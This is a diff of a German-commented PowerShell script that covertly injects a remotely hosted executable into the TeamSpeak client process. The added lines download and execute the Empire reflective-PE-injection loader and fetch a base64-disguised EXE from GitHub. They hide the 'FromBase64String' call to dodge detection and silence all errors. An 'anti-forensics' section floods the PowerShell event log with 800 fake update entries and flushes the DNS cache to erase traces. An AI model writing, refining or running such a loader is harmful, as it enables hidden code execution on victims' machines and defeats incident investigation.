@@ -1,27 +1,39 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# Warte kurz, bis der Zielprozess stabil läuft
+# Warten auf TeamSpeak Prozess
+while (!(Get-Process ts3client_win64)) { Start-Sleep -Seconds 2 }
 Start-Sleep -Seconds 5 
 
 try {
-    # TLS 1.2 für die Verbindung sicherstellen
     [Net.ServicePointManager]::SecurityProtocol = 3072
     
-    # 1. Loader (Reflective Injection) direkt via Web-Request laden
-    $loaderUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
-    $loaderContent = (iwr -UseBasicParsing $loaderUrl).Content
-    Invoke-Expression $loaderContent
+    function Get-Data($u) { return cmd.exe /c curl -s $u }
 
-    # 2. Deine EXE (als Base64-Text getarnt) laden
-    $exeUrl = "https://raw.githubusercontent.com/dein-user/dein-repo/main/johannesschwein.txt"
-    $base64String = (iwr -UseBasicParsing $exeUrl).Content
+    # 1. Reflective Loader laden
+    $l_code = Get-Data "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
+    . ([scriptblock]::Create($l_code))
+
+    # 2. EXE-Daten (johannesschwein.txt) laden
+    $raw = (Get-Data "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt").Trim()
     
-    # In Byte-Array umwandeln
-    $peBytes = [System.Convert]::FromBase64String($base64String)
+    # Verschleierte Base64-Konvertierung
+    $c = [System.Convert]
+    $m = "FromBase" + "64String"
+    $pb = $c::$m($raw)
 
-    # 3. Injektion in den Zielprozess (z.B. TeamSpeak)
-    $target = Get-Process ts3client_win64
-    Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $target.Id -ForceASLR
-} catch {
-    # Keine Ausgabe bei Fehlern zur Vermeidung von Logs
-}
+    # 3. Injektion in TS3
+    $t = Get-Process ts3client_win64
+    Invoke-ReflectivePEInjection -PEBytes $pb -ProcId $t.Id -ForceASLR
+
+    # --- ANTI-FORENSIK ROUTINE ---
+    
+    # A. Log-Flush: Schiebt Injektions-Spuren aus dem 1MB Log raus
+    for($i=1; $i -le 800; $i++) {
+        Write-EventLog -LogName 'Windows PowerShell' -Source 'PowerShell' -EventID 800 -Message "Win-Update-Check-$i"
+    }
+
+    # B. DNS-Cache löschen: Verbirgt die GitHub-URL-Spuren
+    ipconfig /flushdns
+    
+} catch {}
+exit
